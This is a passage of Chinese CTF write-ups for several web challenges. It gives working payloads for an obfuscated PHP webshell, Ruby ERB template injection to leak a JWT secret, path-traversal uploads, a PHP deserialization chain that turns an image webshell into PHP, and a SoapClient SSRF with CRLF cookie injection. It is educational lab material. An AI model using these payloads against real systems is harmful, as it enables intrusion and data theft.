src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406160337447.png" alt="image-20220406160337447"></p><p>最终payload</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;$__&#x3D;[];$___&#x3D;[];$_&#x3D;$__&#x3D;&#x3D;$___;$____&#x3D;~(北)[$_].~(冲)[$_].~(北)[$_].~(择)[$_].~(的)[$_].~(和)[$_];$_____&#x3D;_.~(说)[$_].~(小)[$_].~(笔)[$_].~(站)[$_];$____($$_____[$____]);</code></pre><p>php传上去直接给注释了，所以可以用短标签</p><p>flag在环境变量里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406164336286.png" alt="image-20220406164336286"></p><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>点进去之前我还以为是个条件竞争。。。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141457347.png" alt="image-20220407141457347"></p><p>钱显然不够买flag的，点work可以增加，但是这道题显然不是为了测脚本编写水平的</p><p>网站存在jwt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141641849.png" alt="image-20220407141641849"></p><p>解码看一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141659470.png" alt="image-20220407141659470"></p><p>但是这里有着我们不知道的密钥，那么下面就是想办法获取密钥把jwt里的jkl值改大，购买flag就行了</p><p>网站存在robots.txt，访问一下看到filebak路径</p><pre class="language-none"><code class="language-none">require &#39;sinatra&#39;require &#39;sinatra&#x2F;cookies&#39;require &#39;sinatra&#x2F;json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;&#x2F;static&#39;FLAGPRICE &#x3D; 1000000000000000000000000000ENV[&quot;SECRET&quot;] &#x3D; SecureRandom.hex(64)configure do  enable :logging  file &#x3D; File.new(File.dirname(__FILE__) + &#39;&#x2F;..&#x2F;log&#x2F;http.log&#39;,&quot;a+&quot;)  file.sync &#x3D; true  use Rack::CommonLogger, fileendget &quot;&#x2F;&quot; do  redirect &#39;&#x2F;shop&#39;, 302endget &quot;&#x2F;filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;&#x2F;api&#x2F;auth&quot; do  payload &#x3D; &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth &#x3D; JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] &#x3D; authendget &quot;&#x2F;api&#x2F;info&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;&#x2F;shop&quot; do  erb :shopendget &quot;&#x2F;work&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth &#x3D; auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] &#x3D; auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result  endendpost &quot;&#x2F;shop&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] &#x3D; auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;&#x2F;shop&#39;)  endend</code></pre><p>这里是个ruby的模板注入漏洞</p><p><a href="https://www.anquanke.com/post/id/86867">【技术分享】手把手教你如何完成Ruby ERB模板注入 - 安全客，安全资讯平台 (anquanke.com)</a></p><p>主要是看work路由这块</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407142001278.png" alt="image-20220407142001278"></p><p>ruby没学过，也没安环境，有的地方就直接截别的师傅的博客了</p><p>先看下边这段</p><p>这段大概意思就是要我们输入的do的参数和<code>#&#123;params[:name][0,7]&#125; is working</code>这块进行一个比较，如果相等就会执行<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code>这段，而<code>#&#123;params[:name][0,7]&#125;</code>这里我们是可以控制的，也就是所谓的ruby的<code>Erb</code>模板注入，注入语句的格式是&lt;%=%&gt;至少是五个字符，但是之前的参数的比较只比较name参数的前七位，所以我们实际能控制的也就只有两个字符</p><p>我们可以先试试让它输出1，特殊字符记得要先url编个码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407144338866.png" alt="image-20220407144338866"></p><p>再看上边这段，他会将我们以secret为键的参数与环境变量里的secret进行比较，然后输出境变量里的secret</p><p>这里需要用到<code>Ruby</code>语言的一个特性。ruby的全局变量</p><p><a href="https://blog.csdn.net/zdq0394123/article/details/8443694">(3条消息) Ruby全局变量汇总_zdq0394的博客-CSDN博客</a></p><p>我们可以利用其中的<code>$&#39;</code>来返回正则匹配结果的右边</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407145649686.png" alt="image-20220407145649686"></p><p>所以我们如果把传入的secret值为空，那么默认环境变量里的secret全在匹配结果的右边，也就能读出我们的密钥</p><pre class="language-none"><code class="language-none">&#x2F;work?name&#x3D;&lt;%25&#x3D;$%27%25&gt;&amp;do&#x3D;&lt;%25&#x3D;$%27%25&gt;%20is%20working&amp;SECRET&#x3D;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407145856242.png" alt="image-20220407145856242"></p><p>拿到密钥直接改jwt就行了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150544659.png" alt="image-20220407150544659"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150645048.png" alt="image-20220407150645048"></p><p>买了flag之后再对jwt解个码就能拿到flag了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150731822.png" alt="image-20220407150731822"></p><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>提示是后台五位弱密码</p><p>所以猜admin/admin或者是admin/12345</p><p>进入后直接访问admin.php然后admin/12345登录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409175631685.png" alt="image-20220409175631685"></p><p>这题解法有两种</p><p><strong>第一种</strong></p><p>设计-主题里可以进行自定义设置，而类型可以选php源代码，也就可以直接写入命令来执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409175811880.png" alt="image-20220409175811880"></p><p>但是当你写入时会显示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409180227413.png" alt="image-20220409180227413"></p><p>这是因为在安全这里设置了文件验证</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409180314453.png" alt="image-20220409180314453"></p><p>但是要取消文件验证也要有这个文件</p><p>这时候就要利用这个文件上传功能</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409181921966.png" alt="image-20220409181921966"></p><p>传个文件可以看到存储路径</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182027467.png" alt="image-20220409182027467"></p><p>那如果我们重命名这个文件能不能实现目录穿越，让它上传到我们想要的目录下呢</p><p>结果是可以的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182445406.png" alt="image-20220409182445406"></p><p>然后我们就可以去掉文件验证，然后利用cat /flag查看flag了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182652538.png" alt="image-20220409182652538"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182641926.png" alt="image-20220409182641926"></p><p><strong>方法二</strong></p><p>在导出主题的时候，我们可以看一下下载链接</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;511d2b5b-5b1e-4369-bccf-8bce11b0cea1.node4.buuoj.cn:81&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTIzLnppcA&#x3D;&#x3D;</code></pre><p>对后边这段base64解码可以看出</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183057640.png" alt="image-20220409183057640"></p><p>这里是文件的路径，那我们可以把这个修改成/flag来直接下载flag（猜flag的文件名感觉太看运气了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183154025.png" alt="image-20220409183154025"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183220108.png" alt="image-20220409183220108"></p><p>这道题感觉难度不高，但更像真实环境，所以更需要思路和经验</p><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>打着文件上传名字的反序列化题</p><p>进入后先注册，登录能看到一个文件上传的页面，传个图片上去，发现能看见路径，那很显然要传个马上去连一下。</p><p>这时候我们发现cookie里有一段像base64的编码，解密一下发现是序列化的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411151627165.png" alt="image-20220411151627165"></p><p>一般序列化应该都会给源码，所以找一下目录，有<a href="http://www.tar.gz/">www.tar.gz</a></p><p>主要是这几个文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152330537.png" alt="image-20220411152330537"></p><p>用phpstorm打开之后能发现index.php和register.php里被打了两个断点</p><p>register.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152628334.png" alt="image-20220411152628334"></p><p>index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152643205.png" alt="image-20220411152643205"></p><p>算是出题人给的提示吧，register那里是我们要利用的序列化的入口，registed和checker参数可控，让checker实例化proflie类就能调用profile里的魔术方法，实现我们后面的反序列化，而index那里能够对序列化内容进行反序列化，实现漏洞利用的目的。</p><p>我们再来看看profile.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace app\web\controller;use think\Controller;class Profile extends Controller&#123;    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;    public function __construct()    &#123;        $this-&gt;checker&#x3D;new Index();        $this-&gt;upload_menu&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]);        @chdir(&quot;..&#x2F;public&#x2F;upload&quot;);        if(!is_dir($this-&gt;upload_menu))&#123;            @mkdir($this-&gt;upload_menu);        &#125;        @chdir($this-&gt;upload_menu);    &#125;    public function upload_img()&#123;        if($this-&gt;checker)&#123;            if(!$this-&gt;checker-&gt;login_check())&#123;                $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            &#125;        &#125;        if(!empty($_FILES))&#123;            $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        &#125;        if($this-&gt;ext) &#123;            if(getimagesize($this-&gt;filename_tmp)) &#123;                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;;                $this-&gt;update_img();            &#125;else&#123;                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;..&#x2F;index&#39;));            &#125;        &#125;else&#123;            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;..&#x2F;index&#39;));        &#125;    &#125;    public function update_img()&#123;        $user_info&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img)&#123;            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;&#x3D;&gt;addslashes($this-&gt;img)])-&gt;update())&#123;                $this-&gt;update_cookie();                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;..&#x2F;home&#39;));            &#125;else&#123;                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;..&#x2F;index&#39;));            &#125;        &#125;    &#125;    public function update_cookie()&#123;        $this-&gt;checker-&gt;profile[&#39;img&#39;]&#x3D;$this-&gt;img;        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);    &#125;    public function ext_check()&#123;        $ext_arr&#x3D;explode(&quot;.&quot;,$this-&gt;filename);        $this-&gt;ext&#x3D;end($ext_arr);        if($this-&gt;ext&#x3D;&#x3D;&quot;png&quot;)&#123;            return 1;        &#125;else&#123;            return 0;        &#125;    &#125;    public function __get($name)    &#123;        return $this-&gt;except[$name];    &#125;    public function __call($name, $arguments)    &#123;        if($this-&gt;&#123;$name&#125;)&#123;            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);        &#125;    &#125;&#125;</code></pre><p>这是控制文件上传的部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152858757.png" alt="image-20220411152858757"></p><p>这里就是控制上传文件的文件名的位置。这里有三个if为了保证我们能成功执行，我们就必须绕过前两个if然后进入第三个。也就是让checker为0，然后修改cookie时不传文件，ext=1，这样我们就能进入第三个if中</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411163055415.png" alt="image-20220411163055415"></p><p>但是这里对上传的格式有个判断，所以只能传图片了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411180326707.png" alt="image-20220411180326707"></p><p>这里是要利用图片马</p><p>再看下面的copy，将filename_tmp里的内容复制到filename里</p><p>而这两个变量的值是之前赋的</p><pre class="language-none"><code class="language-none">$this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;</code></pre><p>就是说在我们传文件之后，他会创造一个临时文件名保存这个文件，再创建一个md5后的文件名加上.png</p><p>将这个文件的内容给到.png结尾的文件中，所以无论怎么样上传最终的文件都说.png结尾的</p><p><strong>但是我们可以先传个文件，再利用序列化修改cookie来为这两个值重新赋值，因为我们只改了cookie没有传文件，也就不会进入第二个if判断中，再通过第三个if判断的copy函数让我们传的图片马变成php文件</strong></p><p>既然我们找到了反序列化的起点与终点，中间的过程就可以从profile里的魔术变量下手了</p><pre class="language-none"><code class="language-none">读取不可访问属性的值时，__get() 会被调用；在对象中调用一个不可访问方法时，__call() 会被调用。</code></pre><p>__get()中的return $this-&gt;except[$name];name的值就是index(跟__call的两个参数的来源差不多），所以把except赋值成二维数组，键为index值为upload_img就行了</p><p>所以链子是__destruct()-&gt;__call()-&gt;__get()-&gt;upload_img</p><p><strong>解题步骤</strong></p><p>先传图片马，然后找传上去的路径加在filename_tmp和filename里</p><pre class="language-none"><code class="language-none">&lt;?phpnamespace app\web\controller;use think\Controller;class Profile&#123;    public $checker &#x3D; 0;&#x2F;&#x2F;绕过第一个if判断    public $filename_tmp &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;799bad5a3b514f096e69bbc4a7896cd9.png&#39;;    public $filename &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;1.php&#39; ;    public $upload_menu;    public $ext &#x3D; 1;&#x2F;&#x2F;进入第三个if判断    public $img;    public $except &#x3D; array(&quot;index&quot;&#x3D;&gt;&quot;upload_img&quot;);&#125;class Register&#123;    public $checker;    public $registed &#x3D; 0;&#125;$a &#x3D; new Register();$a-&gt;checker &#x3D;new Profile();var_dump(base64_encode(serialize($a)));TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2NjNTUxYWIwMDViMmU2MGZiZGM4OGRlODA5YjJjNGIxLzc5OWJhZDVhM2I1MTRmMDk2ZTY5YmJjNGE3ODk2Y2Q5LnBuZyI7czo4OiJmaWxlbmFtZSI7czo0NzoiLi91cGxvYWQvY2M1NTFhYjAwNWIyZTYwZmJkYzg4ZGU4MDliMmM0YjEvMS5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fX1zOjg6InJlZ2lzdGVkIjtpOjA7fQ&#x3D;&#x3D;</code></pre><p>把cookie改掉然后刷新</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233155520.png" alt="image-20220410233155520"></p><p>会报错，但是实际已经修改成功了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233145938.png" alt="image-20220410233145938"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233226776.png" alt="image-20220410233226776"></p><p>蚁剑连接，在根目录下找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233247139.png" alt="image-20220410233247139"></p><h2 id="bestphp-39-s-revenge"><a href="#bestphp-39-s-revenge" class="headerlink" title="bestphp&#39;s revenge"></a>bestphp&#39;s revenge</h2><ul><li>session反序列化</li><li>CRLF</li><li>变量覆盖</li><li>PHP原生类SoapClient的SSRF。</li></ul><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$b &#x3D; &#39;implode&#39;;call_user_func($_GET[&#39;f&#39;], $_POST);session_start();if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);?&gt; </code></pre><p>直接访问flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412182406433.png" alt="image-20220412182406433"></p><p>发现要本地访问，再结合session_start函数，猜测是要利用session反序列化</p><p><strong>session反序列化</strong></p><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。</p><p>session反序列化产生的原因是由于序列化与反序列化的处理器的不同导致的，默认是php</p><p>可以用<code>ini_set(‘session.serialize_handler’, ‘php’)</code>来规定</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412182535003.png" alt="image-20220412182535003"></p><p>如果先利用php_serialize处理器进行序列化，当我们传入的值为<code>|O:4:“test”:0:&#123;&#125;</code>时，序列化的结果就类似与<code>a:1:&#123;s:1:“a”;s:16:&quot;|O:4:“test”:0:&#123;&#125;&quot;;&#125;</code>，而如果用php处理器反序列化，会把a:1:{s:1:“a”;s:16:&quot;看作键名，将这段当作真正的序列化之后的结果来进行反序列化<code>O:4:“test”:0:&#123;&#125;&quot;</code></p><p><strong>CRLF</strong></p><p>看看p牛的文章[CRLF Injection漏洞的利用与实例分析 - phith0n (wooyun.js.org)](<a href="https://wooyun.js.org/drops/CRLF">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><p>简单来说就是利用换行符在响应头里注入一些东西</p><p><strong>SoapClient</strong></p><p>这部分我直接贴别的师傅的博客内容了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412203513020.png" alt="image-20220412203513020"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412204001734.png" alt="image-20220412204001734"></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102960092"> bestphp&#39;s revenge_沐目_01的博客-CSDN博客_bestphp&#39;s revenge</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412204644161.png" alt="image-20220412204644161"></p><p><a href="https://www.anquanke.com/post/id/153065#h2-5">从几道CTF题看SOAP安全问题 - 安全客，安全资讯平台 (anquanke.com)</a></p><p>[<a href="https://www.cnblogs.com/ophxc/p/13168611.html">LCTF]bestphp&#39;s revenge 给我的启发学习 - op_hxc - 博客园 (cnblogs.com)</a></p><p>因为flag.php要求本地登录，所以我们如果能用反序列化调用Soapclient来访问flag.php就能得到flag</p><p><strong>变量覆盖</strong></p><p>extract函数会导致变量覆盖</p><p>知识点了解之后再重新看index.php</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$b &#x3D; &#39;implode&#39;;call_user_func($_GET[&#39;f&#39;], $_POST);session_start();if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);?&gt; </code></pre><p>要在调用Soapclient反序列化，就要有一个不存在的方法被调用，而extract可以导致变量覆盖，那我们就利用第一个回调函数，将b赋值为call_user_func，如果传入的参数是 array 型的话，会将数组的成员当作 <code>类名</code> 和 <code>方法名</code>。此时第二个回调函数的内容为</p><pre class="language-none"><code class="language-none">call_user_func(call_user_func(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;))</code></pre><p>关于reset函数：reset() 函数将内部指针指向数组中的第一个元素，并输出。<br>在这里就相当于<code>$_SESSION[&#39;name&#39;]</code></p><p>我们只要传入name=Soapclient就能将这段语句变为</p><p>call_user_func(call_user_func(array(Soapclient,&#39;welcome_to_the_lctf2018&#39;)));因为Soapclient显然没有welcome_to_the_lctf2018这个方法，也就会调用其中的_call方法，触发反序列化</p><p><strong>在修改序列化引擎的部分</strong></p><p>正常的话，比如我们在入门PHP的session反序列化的时候，改变php引擎的方法是ini_set（）函数，但是这个函数不接受数组，call_user_func($_GET[&#39;f&#39;], $_POST);而这里的post超级全局变量是一个数组，所以ini_set就不行了，于是使用session_start来代替，同时呢session.serialize_handler = php_serialize也变成了serialize_handler=php_serialize。</p><p><strong>poc</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;$attack &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,    &#39;user_agent&#39; &#x3D;&gt; &quot;test\r\nCookie: PHPSESSID&#x3D;96sujaq7o5tl0btee8urnlsrb3\r\n&quot;,    &#39;uri&#39; &#x3D;&gt; &quot;123&quot;));$payload &#x3D; urlencode(serialize($attack));echo $payload;&#x2F;&#x2F;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22test%0D%0ACookie%3A+PHPSESSID%3D96sujaq7o5tl0btee8urnlsrb3%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412211949816.png" alt="image-20220412211949816"></p><p>然后我们再通过</p><p>extract来实现触发反序列化的操作</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412212102110.png" alt="image-20220412212102110"></p><p>这实际上已经成功了，相当于用一个PHPSESSID=96sujaq7o5tl0btee8urnlsrb的账号访问到了flag.php，接下来我们只要将cookie改为这个就行了</p><p><img 